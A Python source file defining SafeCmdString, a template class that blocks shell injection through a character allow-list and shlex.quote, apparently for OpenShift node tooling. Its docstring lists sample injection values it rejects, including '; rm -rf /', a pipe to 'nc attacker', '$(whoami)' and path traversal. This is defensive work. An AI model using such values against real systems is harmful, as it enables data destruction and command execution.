"""Safe command template for preventing shell injection."""

import re
import shlex


class SafeCmdString:
    """Safe command template for preventing shell injection.

    Enforces secure command construction through two mechanisms:
    1. Pre-commit linter: Ensures templates are literal strings (not variables/f-strings/expressions)
    2. Runtime protection: Allows only safe characters + auto-quotes all values with shlex.quote()

    SAFE patterns:
        SafeCmdString("cat /etc/hostname")                      # Static command
        SafeCmdString("find {path}").format(path="/tmp")        # Named placeholder
        SafeCmdString("sudo ethtool {}").format("eth0")         # Positional placeholder
        SafeCmdString("{} {}").format("cmd", "arg")             # Multiple positional
        SafeCmdString("ip link show {iface}").format(iface="br-ex")     # Interface with dash
        SafeCmdString("nmcli conn show {bond}").format(bond="bond0.110") # Interface with dot
        SafeCmdString("cat {path}").format(path="/var/log")     # Paths with / are allowed
        SafeCmdString("cmd1") + SafeCmdString("cmd2")           # Concatenation with + operator

    UNSAFE patterns (blocked by pre-commit linter):
        template = "cat {file}"
        SafeCmdString(template)                                 # Variable - BLOCKED
        SafeCmdString(f"cat {file}")                            # f-string - BLOCKED
        SafeCmdString("cat " + file)                            # Concatenation - BLOCKED
        SafeCmdString("cat {f}".format(f=file))                 # Pre-formatted - BLOCKED
        cmd1, cmd2 = SafeCmdString("a"), SafeCmdString("b")     # Multiple per line - BLOCKED

    UNSAFE patterns (blocked at runtime by format() validation):
        SafeCmdString("cat {f}").format(f="/etc/passwd; rm -rf /")      # Shell metacharacters
        SafeCmdString("cat {f}").format(f="/etc/passwd | nc attacker")  # Pipe operator
        SafeCmdString("cat {f}").format(f="$(whoami)")                  # Command substitution
        SafeCmdString("rm {f}").format(f="-rf")                         # Leading dash
        SafeCmdString("rm {f}").format(f="--help")                      # Leading dashes
        SafeCmdString("cat {p}").format(p="../../../etc/passwd")        # Path traversal
        SafeCmdString("cat {p}").format(p="relative/path")              # Relative path
        SafeCmdString("cat {p}").format(p="/var/run/file.tar.gz")       # Multiple dots
        SafeCmdString("cat {p}").format(p="/proc/net/bonding/")         # Trailing slash

    Runtime protection (format() method):
        1. ALLOWS safe characters:
           - Absolute paths: /path/to/file or /path/to/file.ext
             * Must start with /
             * Can contain: letters, digits, dashes, underscores in path components
             * Optional: ONE dot in filename only (for extension)
             * Examples: /var/log/messages, /etc/file-name.txt, /tmp/test_file.log
             * Blocked: dots in directory names, multiple dots in filename, relative paths

           - Identifiers: alphanumeric start, then letters/digits/underscores/dots/dashes/spaces
             * Must start with letter or digit (prevents leading dash/dot/underscore security issue)
             * Examples: eth0, bond0, br-ex, bond0.110, ovn-k8s-mp0, test_file, hello world
             * Blocked: -rf, --help, .hidden, _private (leading dash/dot/underscore)

           - Etcd URLs: https://etcd-N.etcd.openshift-etcd.svc:2379/path (validated pattern)
           - Etcd IP URLs: https://IP:2379/path (pattern validated, invalid IPs fail naturally in curl)
           - PCI addresses: 01:00.0 or 0000:01:00.0 (validated hex pattern)

        2. All values are wrapped with shlex.quote() for safe shell execution

        3. Detects unfilled placeholders when format() is called without arguments

    Security: Leading dashes (-) are blocked in generic identifiers to prevent command argument
    parser issues (e.g., preventing "-rf" or "--help" from being interpreted as flags).
    In absolute paths, leading dashes are safe because the / prefix prevents flag interpretation.
    """

    # Compile regex pattern once at class level (not per method call)
    # This pattern blocks dangerous chars AND allows only safe chars/paths/etcd URLs/PCI addresses
    _ALLOWED_PATTERN = re.compile(
        r"^("
        # Etcd URLs
        r"https://etcd-[0-9]+\.etcd\.openshift-etcd\.svc:2379(/[a-z]+)?|"
        r"https://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:2379(/[a-z]+)?|"
        r"https://localhost:2379(/[a-z]+)?|"
        # PCI addresses
        r"[0-9a-fA-F]{4}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}\.[0-9]|"  # Long format (0000:01:00.0)
        r"[0-9a-fA-F]{2}:[0-9a-fA-F]{2}\.[0-9]|"  # Short format (01:00.0)
        # Absolute paths: /path/to/file or /path/to/file.ext
        # - Must start with /
        # - Directories: letters, digits, dashes, underscores (no dots)
        # - Filename: letters, digits, dashes, underscores + optional .extension
        r"/([a-zA-Z0-9_-]+/)*[a-zA-Z0-9_-]+(\.[a-zA-Z0-9]+)?|"
        # Identifiers: letters/digits/dots/dashes/spaces (no leading dash/dot for security)
        r"[a-zA-Z0-9][a-zA-Z0-9_.\- ]*"
        r")$"
    )

    def __init__(self, template: str):
        """Initialize with command template.

        Args:
            template: Command template with {placeholder} syntax, or static command
                      MUST be a string literal - pre-commit linter enforces this
        """
        self._template = template

    def _check_unfilled_placeholders(self):
        """Check for unfilled placeholders in template.

        Raises:
            ValueError: If template has unfilled placeholders
        """
        placeholder_pattern = re.compile(r"\{[^}]*\}")
        placeholders = placeholder_pattern.findall(self._template)
        if placeholders:
            # Determine if first placeholder is positional or named
            first_placeholder = placeholders[0].strip("{}")
            if first_placeholder:
                # Named placeholder like {name}
                fix_example = f".format({first_placeholder}=...)"
            else:
                # Positional placeholder like {}
                fix_example = ".format(...)"

            raise ValueError(
                f"Template has unfilled placeholders: {', '.join(placeholders)}\n"
                f"Template: {self._template!r}\n"
                f"You provided: no arguments to .format()\n"
                f"Fix: Provide values with {fix_example} "
                f"or remove .format() call if template is static"
            )

    def _validate_value(self, value, param_name: str):
        """Validate and quote a single format value.

        Args:
            value: Value to validate
            param_name: Parameter name/description for error messages

        Returns:
            Safely quoted string value using shlex.quote()

        Raises:
            ValueError: If value contains invalid characters
        """
        # Allow SafeCmdString instances - already validated by linter
        if isinstance(value, SafeCmdString):
            return str(value)

        value_str = str(value) if value is not None else ""

        # Empty string - no quoting needed
        if not value_str:
            return value_str

        # Validate against allowed pattern (blocks dangerous chars implicitly)
        if not self._ALLOWED_PATTERN.match(value_str):
            raise ValueError(
                f"{param_name} contains invalid characters.\n"
                f"Allowed patterns:\n"
                f"  - Absolute paths: /path/to/file or /path/to/file.ext\n"
                f"    (letters, digits, dashes, underscores; ONE dot in filename only)\n"
                f"  - Identifiers: alphanumeric start, then letters/digits/underscores/dots/dashes/spaces\n"
                f"    (e.g., 'eth0', 'br-ex', 'bond0.110', 'ovn-k8s-mp0', 'test_file')\n"
                f"  - Etcd URLs: https://etcd-N.etcd.openshift-etcd.svc:2379/path\n"
                f"  - PCI addresses: 01:00.0 or 0000:01:00.0\n"
                f"Got: {value_str!r}"
            )

        # Always wrap with shlex.quote()
        return shlex.quote(value_str)

    def format(self, *args, **kwargs):
        """Format template with safely quoted variables.

        Allows safe patterns in values:
        - Absolute paths: /path/to/file or /path/to/file.ext
          (letters, digits, dashes, underscores; ONE dot in filename only)
        - Identifiers: alphanumeric start, then letters/digits/underscores/dots/dashes/spaces
          (e.g., 'eth0', 'br-ex', 'bond0.110', 'ovn-k8s-mp0', 'test_file')
        - Etcd URLs: https://etcd-N.etcd.openshift-etcd.svc:2379/path
        - Etcd IP URLs: https://IP:2379/path (with IP validation)
        - PCI addresses: 01:00.0 or 0000:01:00.0 (hex format)

        All values are wrapped with shlex.quote() for safe shell execution.

        Args:
            *args: Positional variables to insert (auto-quoted via shlex.quote)
            **kwargs: Named variables to insert (auto-quoted via shlex.quote)

        Returns:
            SafeCmdString object with formatted command (for type safety)

        Raises:
            ValueError: If any value contains blocked characters or disallowed characters
            ValueError: If template has unfilled placeholders when format() is called without arguments
        """
        if not args and not kwargs:
            self._check_unfilled_placeholders()
            return self

        # Validate positional arguments
        validated_args = []
        for index, value in enumerate(args):
            validated = self._validate_value(value, f"Positional argument {index}")
            validated_args.append(validated)

        # Validate named arguments
        safe_kwargs = {}
        for key, value in kwargs.items():
            validated = self._validate_value(value, f"Parameter '{key}'")
            safe_kwargs[key] = validated

        # Format template with validated values
        try:
            formatted_str = self._template.format(*validated_args, **safe_kwargs)
        except KeyError as e:
            # Improve error message for template mismatches
            placeholder_name = str(e).strip("'")
            raise ValueError(
                f"Template mismatch: placeholder '{{{placeholder_name}}}' expects a named argument.\n"
                f"Template: {self._template!r}\n"
                f"You provided: {len(validated_args)} positional args, {len(safe_kwargs)} named args "
                f"({list(safe_kwargs.keys()) if safe_kwargs else 'none'})\n"
                f"Fix: Use .format({placeholder_name}=...) instead of .format(...)"
            ) from e
        except IndexError as e:
            # Improve error message for missing positional arguments
            raise ValueError(
                f"Template mismatch: not enough positional arguments.\n"
                f"Template: {self._template!r}\n"
                f"You provided: {len(validated_args)} positional args\n"
                f"Fix: Provide more positional arguments to .format()"
            ) from e

        # Return new SafeCmdString object (not string!) for type safety
        return SafeCmdString(formatted_str)

    def __str__(self):
        """Return command string."""
        return self._template

    def __add__(self, other):
        """Concatenate two SafeCmdString objects.

        Args:
            other: Another SafeCmdString object to concatenate

        Returns:
            SafeCmdString: New SafeCmdString with concatenated templates

        Raises:
            TypeError: If other is not a SafeCmdString instance
        """
        if not isinstance(other, SafeCmdString):
            raise TypeError(
                f"unsupported operand type(s) for +: 'SafeCmdString' and '{type(other).__name__}'. "
                "Both operands must be SafeCmdString instances."
            )

        # Simply concatenate the templates with a space separator
        concatenated = f"{self._template} {other._template}"
        return SafeCmdString(concatenated)

    def __repr__(self):
        """Return representation."""
        # Handle edge case where __repr__ is called before _template is set
        template = getattr(self, "_template", "<uninitialized>")
        return f"SafeCmdString({template!r})"
